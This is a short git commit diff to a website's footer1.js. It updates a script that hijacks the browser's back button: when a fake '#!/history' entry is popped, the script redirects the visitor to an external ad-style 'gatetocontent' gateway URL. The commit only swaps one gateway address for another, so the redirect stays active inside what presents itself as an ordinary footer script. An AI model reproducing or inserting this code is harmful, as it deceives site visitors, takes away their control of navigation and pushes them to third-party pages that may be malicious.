d4004578fc95ef91e949b1d828f147b63bd64988
brianfinch-bit <85077897+brianfinch-bit@users.noreply.github.com>
2021-11-14 00:21:57 +0700

    Update footer1.js

--- footer1.js
+++ footer1.js
@@ -6,7 +6,7 @@ window.addEventListener("popstate", function() {
   if(location.hash === "#!/history") {
     history.replaceState(null, document.title, location.pathname);
     setTimeout(function(){
-      location.replace("https://www.trustedgatetocontent.com/eg6cnn35ax?key=4976fb77b439e3d198c9b3c86ffb1bcc");
+      location.replace("https://www.effectivegatetocontent.com/am3fc3kdt5?key=54a2368844e0b04ab35c9193c1fd1a2a");
     },10);
   }
 }, false);
